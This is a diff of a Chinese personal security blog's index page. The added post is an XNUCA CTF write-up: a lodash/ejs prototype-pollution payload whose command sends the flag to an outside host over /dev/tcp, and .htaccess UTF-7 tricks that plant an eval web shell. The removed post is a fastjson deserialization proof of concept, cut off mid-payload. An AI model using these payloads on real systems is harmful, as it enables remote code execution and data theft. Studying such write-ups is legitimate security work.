@@ -317,6 +317,212 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/XNUCA-qualifier-md/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/XNUCA-qualifier-md/index.html" itemprop="url">
+                  XNUCA qualifier writeup
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-08-29 02:26:12 / Modified: 11:44:01" itemprop="dateCreated datePublished" datetime="2019-08-29T02:26:12+08:00">2019-08-29</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>周末打了一下XNUCA，可以说这是打CTF以来难度最高的一个比赛，全场交的flag不到100个也是十分真实，膜精心准备这次比赛的NESE的大师傅们。这里贴一下做出来的两个web题目的writeup与题目分析。</p>
+</blockquote>
+<h2 id="HardJS"><a href="#HardJS" class="headerlink" title="HardJS"></a>HardJS</h2><h3 id="我们的解法"><a href="#我们的解法" class="headerlink" title="我们的解法"></a>我们的解法</h3><p>比赛时听说ROIS的师傅们拿了一血而且是直接RCE的，因此便将重点放到了后端的代码审计上。</p>
+<p>拿到一个nodejs项目的源码进行审计，第一步便是运行<code>npm audit</code> ，可以看到依赖项的漏洞情况。</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567017506/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.33.58_k7scsn.png" alt="image-20190829023406409"></p>
+<p>可以看到依赖项<code>lodash</code>存在原型链污染漏洞，即<code>CVE-2019-10744</code>.</p>
+<p>我们查看一下项目的js源码，看看哪里调用了lodash.在查看消息的请求处理中我们可以看到当消息数量大于5时将会调用<code>lodash.defaultsDeep</code>来合并消息</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567017747/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.42.08_tjlghj.png" alt="lodash"></p>
+<p>根据<code>CVE-2019-10744</code>的信息，我们知道我们只需要有消息为</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"test"</span>,<span class="attr">"content"</span>:&#123;<span class="attr">"prototype"</span>:&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"a"</span>:<span class="string">"b"</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>在合并时便会在<code>Object</code>上附加<code>a=b</code>这样一个属性，任意不存在a属性的原型为Object的对象在访问其<code>a</code>属性时均会获取到<code>b</code>属性。那么这个污染究竟会起到什么样的效果？</p>
+<p>查看项目源码，可以知道该项目使用<code>ejs</code>库作为模版引擎，众所周知<code>ejs</code>作为一个模版引擎肯定少不了类似<code>eval</code>的操作用于解析一些数据。因此我们便可以去跟一下ejs的实现看看哪里有潜在的可以收到原型链污染的调用，这里我们可以找到两处可用的地方</p>
+<h4 id="pollution-one"><a href="#pollution-one" class="headerlink" title="pollution one"></a>pollution one</h4><p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018177/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.49.19_uhwvvr.png" alt="pollution one"></p>
+<p>在577行可以看到很大的一片调用全是为了动态拼接一个js语句，这里我们可以注意到当<code>opts</code>存在属性<code>outputFunctionName</code>时,该属性<code>outputFunctionName</code>便会被直接拼接到这段js中。</p>
+<p>往下跟一下可以看到这段js的具体调用位置</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018436/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.53.42_nvsfjo.png" alt="append"></p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018509/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.54.52_nyndle.png" alt="src"></p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018384/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.52.42_ypo8ns.png" alt="ctor"></p>
+<p>可以看到这段代码最后生成了一个动态的函数，且源码中正含有上述的<code>append</code>.所以我们的思路就很清晰了，只要覆盖了<code>opts.outputFunctionName</code>即可触发模版编译处的RCE.</p>
+<p>最后我们的payload如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"mmp"</span>,<span class="attr">"content"</span>:&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:</span><br><span class="line">&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"a=1;process.mainModule.require('child_process').exec('bash -c \"echo $FLAG&gt;/dev/tcp/xxxxx/xx\"')//"</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>只要提交这样的信息并触发合并操作，访问任意页面即可将flag发送到我们的后端。</p>
+<h3 id="pollution-two"><a href="#pollution-two" class="headerlink" title="pollution two"></a>pollution two</h3><p>除了这里的<code>outputFunctionName</code>外我们也可以覆盖<code>opts.escapeFunction</code>来实现RCE，具体源码关键点对应如下</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018846/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.00.33_jahw5k.png" alt></p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018915/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.01.44_rhgtkj.png" alt></p>
+<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>赛后看了NESE大佬的官方writeup,则利用了前端和后端两个原型链污染的点，后端原型链污染用于绕过登录验证越权登录admin,覆盖<code>login</code>与<code>userid</code>即可</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567019105/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.04.53_zi1rje.png" alt></p>
+<p>而前端的原型链污染则是由于调用了<code>$.extend</code>方法</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567019227/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.06.53_ftongv.png" alt="extend"></p>
+<p>所有的消息都被加入了no-js，我们再看看页面是怎么渲染的</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567046276/blog/QQ20190829-0_txkv7i.jpg" alt="logger"></p>
+<p>Header/notice/wiki/button/message的地方都处在沙箱中，无法XSS，我们再看看页面</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567046527/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.40.21_w1f58y.png" alt></p>
+<p>可以看到我们只要通过原型链污染添加logger属性，即可覆盖logger的内容从而导致XSS。为了打到flag只需要让页面跳转到一个我们设置的伪造的登录窗口即可。</p>
+<p>这道题目预期解将前后端的原型链污染结合利用，可以说是十分精妙的一道题目。</p>
+<h2 id="ezPHP"><a href="#ezPHP" class="headerlink" title="ezPHP"></a>ezPHP</h2><p>源码很简单(感觉越简单的源码越不好搞)，一个写文件的功能且只能写文件名为<code>[a-z\.]*</code> 的文件，且文件内容存在黑名单过滤，并且结尾被加上了一行，这就导致我们无法直接写入<code>.htaccess</code>里面<code>auto_prepend_file</code>等php_value。</p>
+<h3 id="我们的解法-1"><a href="#我们的解法-1" class="headerlink" title="我们的解法"></a>我们的解法</h3><p>经测试，最后一行导致的<code>.htaccess</code>报错的问题可以通过<code># \</code>来解决。</p>
+<p>该文件中有一处<code>include(&#39;fl3g,php&#39;)</code>,该文件名不能通过正则匹配所以我们没办法直接利用该文件来getshell。那么还有什么<code>.htaacess</code>    的选项可以利用？</p>
+<p>翻一下php的官方文档<a href="https://www.php.net/manual/zh/ini.list.php">php.ini配置选项列表</a>，查找所有可修改范围为<code>PHP_INI_ALL</code>即<code>PHP_INI_PERDIR</code>的配置项，我们可以注意到这样一个选项<code>include_path</code>.</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567047371/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.55.54_xb4td6.png" alt="include_path"></p>
+<p>因此只要控制<code>include_path</code>便可以使这里include进来的<code>fl3g.php</code>可以是任意目录下的某个文件，那么怎样才能控制<code>fl3g.php</code>的内容?查找所有php log相关的功能可以看到<code>error_log</code>这一选项</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567047546/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.58.31_zzuevv.png" alt="error_log"></p>
+<p>所以我们的思路便很清晰了：利用error_log写入log文件到<code>/tmp/fl3g.php</code>，再设置<code>include_path=/tmp</code>即可让index.php能够包含我们想要的文件。这里的报错可以通过设置<code>include_path</code>到一个不存在的文件夹即可触发包含时的报错，且include_path的值也会被输出到屏幕上。</p>
+<p>然而很不幸的是error_log的内容默认是<code>htmlentities</code>的,我们无法插入类似<code>&lt;?php phpinfo();?&gt;</code>的payload。那么怎么才能绕过这里的转义？</p>
+<p>查找最近的比赛我们可以发现一篇writeup<a href="[https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md](https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack 2019/l33t-hoster/l33t-hoster.md">Insomnihack 2019 I33t-hoster</a>)</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567047922/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8811.05.09_hvkhnw.png" alt="run php without &lt;"></p>
+<p>这便给了我们启示可以通过设置编码来绕过限制从而getshell.</p>
+<p>因此最后的攻击方法如下：</p>
+<ul>
+<li>Step1 写入<code>.htaccess</code> error_log相关的配置</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;/tmp/xx/+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line">php_value error_reporting 32767</span><br><span class="line">php_value error_log /tmp/fl3g.php</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Step2 访问index.php留下error_log</li>
+<li>Step3 写入.htaccess新的配置</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value include_path &quot;/tmp&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Step4 再访问一次<code>index.php?2=evilcode</code>即可getshell.</li>
+</ul>
+<h3 id="其他非预期解"><a href="#其他非预期解" class="headerlink" title="其他非预期解"></a>其他非预期解</h3><p>赛后得知我们的解法是全场唯一的正解，此外还存在两个非预期</p>
+<h4 id="非预期1"><a href="#非预期1" class="headerlink" title="非预期1"></a>非预期1</h4><p>设置pcre的一些选项可以导致文件名判断失效，从而直接写入<code>fl3g.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure>
+<h3 id="非预期2"><a href="#非预期2" class="headerlink" title="非预期2"></a>非预期2</h3><p>只能说这个非预期为啥我没有想到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;.htaccess&quot;</span><br><span class="line"># &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上便是我们这次XNUCA web部分的writeup，质量非常高的一场比赛，感谢NESE的大佬们。希望国内能多一些这样质量高的CTF，少一些诸如某空间之类的垃圾比赛，也希望CTF圈选手们以后都能<code>洁身自好</code>杜绝py现象。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/threatIntelligence/index.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2024,204 +2230,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/fastjson-deserialize/index.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Imagemlt">
-      <meta itemprop="description" content="personal blog">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Image's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/fastjson-deserialize/index.html" itemprop="url">
-                  fastjson反序列化复现
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-12-25 23:09:45" itemprop="dateCreated datePublished" datetime="2018-12-25T23:09:45+08:00">2018-12-25</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-04-05 21:31:52" itemprop="dateModified" datetime="2019-04-05T21:31:52+08:00">2019-04-05</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="fastjson反序列化复现"><a href="#fastjson反序列化复现" class="headerlink" title="fastjson反序列化复现"></a>fastjson反序列化复现</h1><p>最近复现一些java方面的漏洞，之前护网杯遇到过一次fastjson反序列化利用的题目，于是这里便从在idea中创建一个maven项目开始复现一下fastjson的反序列化漏洞。</p>
-<p>fastjson反序列化漏洞的主要影响范围是&lt;=1.2.24版本的fastjson。因此，参考<a href="https://blog.csdn.net/zzy1078689276/article/details/78732183/">在IDEA中创建maven项目</a>在创建好maven项目之后，编辑pom.xml加入fastjson需要的dependency：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>之后首先编辑ShellExec类,这个类也是反序列化的一个目标类</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.alijsondeser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShellExec</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ShellExec</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"mkdir /tmp/imagemlt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ShellExec t = <span class="keyword">new</span> ShellExec();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>然后便是我们的poc类</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.alijsondeser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by web on 2017/4/29.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">test_autoTypeDeny</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</span><br><span class="line">        <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/target/classes/com/alijsondeser/ShellExec.class"</span>;</span><br><span class="line">        <span class="comment">//final String evilClassPath = "/tmp/ShellExec.class";</span></span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line"></span><br><span class="line">        Object obj = JSON.parseObject(text1,Object.class,config,Feature.SupportNonPublicField);</span><br><span class="line">        <span class="comment">//assertEquals(Model.class, obj.getClass());</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>执行poc，查看目录可以看到已经被执行</p>
-<p><img src="https://coding.net/u/ImageMLT/p/blog-images/git/raw/master/image-20181225231956222.png" alt="image-20181225231956222"></p>
-<p>生成的payload为：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMY29tL2FsaWpzb25kZXNlci9TaGVsbEV4ZWM7AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY